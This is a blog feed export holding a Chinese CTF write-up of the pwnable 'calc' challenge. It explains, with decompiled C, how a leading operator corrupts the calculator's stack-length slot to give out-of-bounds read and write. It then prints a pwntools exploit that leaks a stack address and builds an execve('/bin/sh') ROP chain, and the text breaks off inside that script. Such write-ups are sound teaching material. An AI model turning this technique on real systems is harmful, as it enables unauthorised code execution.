{
    "version": "https://jsonfeed.org/version/1",
    "title": "-NIYAH- • All posts by \"pwnable\" tag",
    "description": "Niyah",
    "home_page_url": "http://niyah.cn",
    "items": [
        {
            "id": "http://niyah.cn/CTF/pwnable%20calc%E9%A2%98%E8%A7%A3/",
            "url": "http://niyah.cn/CTF/pwnable%20calc%E9%A2%98%E8%A7%A3/",
            "title": "pwnable calc题解",
            "date_published": "2022-02-06T16:00:00.000Z",
            "content_html": "<p>这题真有意思</p>\n<a id=\"more\"></a>\n<h1 id=\"pwnable-calc题解\"><a class=\"markdownIt-Anchor\" href=\"#pwnable-calc题解\">#</a> pwnable calc 题解</h1>\n<p>对本程序实现了一个简单的计算器</p>\n<p>对本程序的逆向首先需要了解编译原理中的算符优先文法，在下面的函数中程序用了两个数组分别当成数栈 nums 和字符栈 signs，其中数栈有点特别，数栈的栈底即 nums [0] 存放了栈的长度即数的个数，在进行输入分析时会使用这两个栈</p>\n<p>parse_expr 函数</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">parse_expr</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>user_input<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>nums<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">int</span> idx<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>pointer<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+20h] [ebp-88h]</span>\n  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+24h] [ebp-84h]</span>\n  <span class=\"token keyword\">int</span> index<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+28h] [ebp-80h]</span>\n  <span class=\"token keyword\">int</span> offset<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+2Ch] [ebp-7Ch]</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>num_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+30h] [ebp-78h]</span>\n  <span class=\"token keyword\">int</span> num<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+34h] [ebp-74h]</span>\n  <span class=\"token keyword\">char</span> signs<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+38h] [ebp-70h] BYREF</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> canary<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+9Ch] [ebp-Ch]</span>\n\n  <span class=\"token comment\">// 和编译原理的算符优先文法类似</span>\n  <span class=\"token comment\">// 使用两个数组分别存放符号和数字，当遇到优先级高的符号则执行</span>\n  canary <span class=\"token operator\">=</span> <span class=\"token function\">__readgsdword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x14u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  pointer <span class=\"token operator\">=</span> user_input<span class=\"token punctuation\">;</span>\n  index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">bzero</span><span class=\"token punctuation\">(</span>signs<span class=\"token punctuation\">,</span> <span class=\"token number\">0x64u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token string\">'0'</span> <span class=\"token operator\">></span> <span class=\"token number\">9</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token comment\">// 当前为符号则进行下面操作，注意这个判断在结尾即字符等于\\x00时也会成立</span>\n      offset <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> pointer<span class=\"token punctuation\">;</span>\n      num_chunk <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>num_chunk<span class=\"token punctuation\">,</span> pointer<span class=\"token punctuation\">,</span> offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      num_chunk<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span>num_chunk<span class=\"token punctuation\">,</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prevent division by zero\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 只要数字是0就直接寄，无论加减乘除</span>\n      <span class=\"token punctuation\">&#125;</span>\n      num <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>num_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> num <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n        idx <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>nums<span class=\"token punctuation\">)</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n        nums<span class=\"token punctuation\">[</span>idx <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> num<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 这里可以看出，这个nums[0]存放的是数字个数,后面可以发现idx是可控的</span>\n      <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> user_input<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token string\">'0'</span> <span class=\"token operator\">></span> <span class=\"token number\">9</span> <span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"expression error!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 连着两个符号也寄</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      pointer <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>user_input<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> signs<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// 符号数组有东西执行操作，优先级判断，当前符号比算符栈顶优先级小时，从算符栈拿一个符号，从数栈拿两个数进行计算</span>\n        <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span> user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n          <span class=\"token keyword\">case</span> <span class=\"token string\">'%'</span><span class=\"token operator\">:</span>\n          <span class=\"token keyword\">case</span> <span class=\"token string\">'*'</span><span class=\"token operator\">:</span>\n          <span class=\"token keyword\">case</span> <span class=\"token string\">'/'</span><span class=\"token operator\">:</span>\n            <span class=\"token comment\">// #+      *</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> signs<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">'+'</span> <span class=\"token operator\">&amp;&amp;</span> signs<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">'-'</span> <span class=\"token punctuation\">)</span>\n              <span class=\"token keyword\">goto</span> LABEL_14<span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 如果符号栈顶为+-，则把当前符号入栈</span>\n            signs<span class=\"token punctuation\">[</span><span class=\"token operator\">++</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">case</span> <span class=\"token string\">'+'</span><span class=\"token operator\">:</span>\n          <span class=\"token keyword\">case</span> <span class=\"token string\">'-'</span><span class=\"token operator\">:</span>\nLABEL_14<span class=\"token operator\">:</span>\n            <span class=\"token comment\">// 进行计算，进行计算的两个数为nums末尾的两个数，计算算符为符号栈顶，之后将结果放进前一个数的位置，和栈结构类似，其实就是pop pop 计算 push</span>\n            <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">,</span> signs<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 计算之后将当前符号入算符栈</span>\n            signs<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">default</span><span class=\"token operator\">:</span>\n            <span class=\"token comment\">// 到用户输入末尾，直接进行计算</span>\n            <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">,</span> signs<span class=\"token punctuation\">[</span>index<span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token keyword\">else</span>\n      <span class=\"token punctuation\">&#123;</span>\n        signs<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n      <span class=\"token comment\">// 如果此时到达用户输入结尾则退出循环</span>\n      <span class=\"token comment\">// 但是这个判断放在了最后，很奇怪</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> index <span class=\"token operator\">>=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">,</span> signs<span class=\"token punctuation\">[</span>index<span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>eval 函数</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\">_DWORD <span class=\"token operator\">*</span>__cdecl <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span>nums<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> sign<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  _DWORD <span class=\"token operator\">*</span>result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> sign <span class=\"token operator\">==</span> <span class=\"token string\">'+'</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> sign <span class=\"token operator\">></span> <span class=\"token string\">'+'</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> sign <span class=\"token operator\">==</span> <span class=\"token string\">'-'</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n      nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> sign <span class=\"token operator\">==</span> <span class=\"token string\">'/'</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n      nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">/=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> sign <span class=\"token operator\">==</span> <span class=\"token string\">'*'</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*=</span> nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  result <span class=\"token operator\">=</span> nums<span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">--</span><span class=\"token operator\">*</span>nums<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>上面的函数存在以下问题，当用户输入的数据是以符号开头的，则数栈中只有两个数：第一个数 nums [0] 为该数组的长度，第二个数为操作数，那么执行 eval 时则会对 nums [0] 和 nums [1] 进行操作，而 nums [0] 则存放了数栈的大小，而程序由于判断有问题，即使输入不合法也会执行一个 eval，那么就实现了对 nums [idx] 中 idx 的控制，从而可以实现对 nums 的越界读写</p>\n<blockquote>\n<p>如用户输入 +120，此时</p>\n<p>nums[0] = 1</p>\n<p>nums[1] = 120</p>\n<p>执行 eval 后 nums [0] += nums [1] , 此时</p>\n<p>nums[0] = 121</p>\n<p><strong>数组长度反而变成 121 了，那么在下次如果是输出结果则会输出 nums [121]，如果继续读入数时会在  nums [122] 写入这个数，之后执行 eval 时会将结果放进 nums [121] 从而实现数组的越界读写</strong></p>\n</blockquote>\n<p>因为本程序为 32 位静态链接，所有 gadget 可以在程序中找到，故直接在返回地址写上 syscall 的 rop 调用链</p>\n<p>exp</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./calc'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu64<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu32<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': \\033[1;36m 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">ras</span><span class=\"token punctuation\">(</span> data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    <span class=\"token comment\"># execve 只能是 /bin/sh\\x00</span>\n\n    syscall <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'int 0x80'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_eax_ret <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop eax;ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_edx_ecx_ebx_ret <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop edx ; pop ecx ; pop ebx ; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'=== Welcome to SECPROG calculator ==='</span><span class=\"token punctuation\">)</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token string\">'+360'</span><span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'-'</span><span class=\"token punctuation\">)</span>\n    ebp <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff</span> <span class=\"token operator\">-</span> rint<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n    stack_addr <span class=\"token operator\">=</span> ebp \n    \n    rop_chain <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n        pop_edx_ecx_ebx_ret<span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        stack_addr<span class=\"token punctuation\">,</span>\n        pop_eax_ret<span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xb</span><span class=\"token punctuation\">,</span>\n        syscall\n    <span class=\"token punctuation\">]</span>\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'pop_edx_ecx_ebx_ret'</span><span class=\"token 